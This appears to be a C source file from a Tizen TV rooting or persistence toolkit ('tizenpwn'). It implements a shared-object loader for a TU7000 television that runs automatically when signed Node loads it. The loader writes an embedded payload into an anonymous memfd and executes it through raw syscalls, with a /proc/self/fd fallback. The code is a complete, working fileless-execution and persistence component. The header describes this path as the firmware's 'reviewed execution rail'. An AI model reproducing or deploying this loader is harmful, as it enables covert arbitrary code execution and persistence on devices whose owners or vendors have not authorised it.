/*
 * Dependency-free memfd loader for the TU7000 persistence rail.
 *
 * Node 4.4.3 on the target is soft-float ARM and exposes process.dlopen().
 * This shared object is loaded by signed Node; its constructor writes the
 * embedded static payload to a memfd and executes it. It links no libc and
 * makes only raw Linux syscalls, so it does not depend on the TV's libc ABI.
 *
 * UEP is not changed. The execve target is an anonymous memfd, which is the
 * reviewed execution rail for this firmware.
 */

#if !defined(__arm__) && !defined(__x86_64__)
#error "unsupported loader architecture"
#endif

#if defined(__arm__)
#define SYS_WRITE 4
#define SYS_EXIT 1
#define SYS_MEMFD_CREATE 385
#define SYS_FCHMOD 15
#define SYS_EXECVE 11
#define SYS_EXECVEAT 387
#define SYS_OPEN 5
#define SYS_CLOSE 6
#else
#define SYS_WRITE 1
#define SYS_EXIT 60
#define SYS_MEMFD_CREATE 319
#define SYS_FCHMOD 91
#define SYS_EXECVE 59
#define SYS_EXECVEAT 322
#define SYS_OPEN 2
#define SYS_CLOSE 3
#endif

#define AT_EMPTY_PATH 0x1000

extern const unsigned char tizenpwn_payload[];
extern const unsigned char tizenpwn_payload_end[];

#define O_WRONLY 1
#define O_CREAT 0100
#define O_TRUNC 01000

#include "loader_config.h"

#if defined(__arm__)
static inline long syscall0(long number) {
    register long r0 __asm__("r0");
    register long r7 __asm__("r7") = number;
    __asm__ volatile("svc 0" : "=r"(r0) : "r"(r7) : "memory");
    return r0;
}

static inline long syscall1(long number, long a0) {
    register long r0 __asm__("r0") = a0;
    register long r7 __asm__("r7") = number;
    __asm__ volatile("svc 0" : "+r"(r0) : "r"(r7) : "memory");
    return r0;
}

static inline long syscall2(long number, long a0, long a1) {
    register long r0 __asm__("r0") = a0;
    register long r1 __asm__("r1") = a1;
    register long r7 __asm__("r7") = number;
    __asm__ volatile("svc 0" : "+r"(r0) : "r"(r1), "r"(r7) : "memory");
    return r0;
}

static inline long syscall3(long number, long a0, long a1, long a2) {
    register long r0 __asm__("r0") = a0;
    register long r1 __asm__("r1") = a1;
    register long r2 __asm__("r2") = a2;
    register long r7 __asm__("r7") = number;
    __asm__ volatile("svc 0"
                     : "+r"(r0)
                     : "r"(r1), "r"(r2), "r"(r7)
                     : "memory");
    return r0;
}

static inline long syscall5(
    long number, long a0, long a1, long a2, long a3, long a4
) {
    register long r0 __asm__("r0") = a0;
    register long r1 __asm__("r1") = a1;
    register long r2 __asm__("r2") = a2;
    register long r3 __asm__("r3") = a3;
    register long r4 __asm__("r4") = a4;
    register long r7 __asm__("r7") = number;
    __asm__ volatile("svc 0"
                     : "+r"(r0)
                     : "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r7)
                     : "memory");
    return r0;
}
#else
static inline long syscall0(long number) {
    long result;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number)
                     : "rcx", "r11", "memory");
    return result;
}

static inline long syscall1(long number, long a0) {
    long result;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number), "D"(a0)
                     : "rcx", "r11", "memory");
    return result;
}

static inline long syscall2(long number, long a0, long a1) {
    long result;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number), "D"(a0), "S"(a1)
                     : "rcx", "r11", "memory");
    return result;
}

static inline long syscall3(long number, long a0, long a1, long a2) {
    long result;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number), "D"(a0), "S"(a1), "d"(a2)
                     : "rcx", "r11", "memory");
    return result;
}

static inline long syscall5(
    long number, long a0, long a1, long a2, long a3, long a4
) {
    long result;
    register long r10 __asm__("r10") = a3;
    register long r8 __asm__("r8") = a4;
    __asm__ volatile("syscall"
                     : "=a"(result)
                     : "a"(number), "D"(a0), "S"(a1), "d"(a2),
                       "r"(r10), "r"(r8)
                     : "rcx", "r11", "memory");
    return result;
}
#endif

static void fail(const char *message, unsigned long length) {
#ifdef TIZENPWN_ERROR_FILE
    long file = syscall3(
        SYS_OPEN,
        (long)TIZENPWN_ERROR_FILE,
        O_WRONLY | O_CREAT | O_TRUNC,
        0600
    );
    if (file >= 0) {
        syscall3(SYS_WRITE, file, (long)message, (long)length);
        syscall1(SYS_CLOSE, file);
    }
#endif
    syscall3(SYS_WRITE, 2, (long)message, (long)length);
    syscall1(SYS_EXIT, 127);
    for (;;) {
    }
}

#define FAIL(message) fail(message, sizeof(message) - 1)

#ifdef TIZENPWN_DEBUG
static void debug(const char *message, unsigned long length) {
    syscall3(SYS_WRITE, 2, (long)message, (long)length);
}
#define DEBUG(message) debug(message, sizeof(message) - 1)
#else
#define DEBUG(message) ((void)0)
#endif

static void exec_from_proc_fd(long fd) {
    static const unsigned long powers[] = {
        1000000000UL, 100000000UL, 10000000UL, 1000000UL,
        100000UL, 10000UL, 1000UL, 100UL, 10UL, 1UL,
    };
    char path[64];
    const char prefix[] = "/proc/self/fd/";
    unsigned long index = 0;
    unsigned long value = (unsigned long)fd;
    int started = 0;
    unsigned long position;

    while (prefix[index] != '\0') {
        path[index] = prefix[index];
        index++;
    }
    for (position = 0; position < sizeof(powers) / sizeof(powers[0]);
         position++) {
        unsigned long power = powers[position];
        char digit = '0';
        while (value >= power) {
            value -= power;
            digit++;
        }
        if (digit != '0' || started || power == 1) {
            path[index++] = digit;
            started = 1;
        }
    }
    path[index] = '\0';
    syscall3(
        SYS_EXECVE,
        (long)path,
        (long)tizenpwn_argv,
        (long)tizenpwn_envp
    );
}

static void tizenpwn_loader(void);

static void (*const tizenpwn_init)(void)
    __attribute__((section(".init_array"), used)) = tizenpwn_loader;

static void tizenpwn_loader(void) {
    const unsigned char *cursor = tizenpwn_payload;
    unsigned long remaining = (unsigned long)(
        tizenpwn_payload_end - tizenpwn_payload
    );
    long fd;

    DEBUG("tizenpwn loader: constructor\n");
    if (remaining == 0) {
        FAIL("tizenpwn loader: empty payload\n");
    }
    fd = syscall2(
        SYS_MEMFD_CREATE,
        (long)"tizenpwn-payload",
        0
    );
    if (fd < 0) {
        FAIL("tizenpwn loader: memfd_create failed\n");
    }
    DEBUG("tizenpwn loader: memfd created\n");
    while (remaining > 0) {
        long written = syscall3(
            SYS_WRITE, fd, (long)cursor, (long)remaining
        );
        if (written <= 0) {
            FAIL("tizenpwn loader: payload write failed\n");
        }
        cursor += written;
        remaining -= (unsigned long)written;
    }
    DEBUG("tizenpwn loader: payload written\n");
    if (syscall2(SYS_FCHMOD, fd, 0700) < 0) {
        FAIL("tizenpwn loader: fchmod failed\n");
    }
    DEBUG("tizenpwn loader: execveat\n");
    syscall5(
        SYS_EXECVEAT,
        fd,
        (long)"",
        (long)tizenpwn_argv,
        (long)tizenpwn_envp,
        AT_EMPTY_PATH
    );
    DEBUG("tizenpwn loader: execveat failed; trying procfs\n");
    exec_from_proc_fd(fd);
    FAIL("tizenpwn loader: exec failed\n");
}
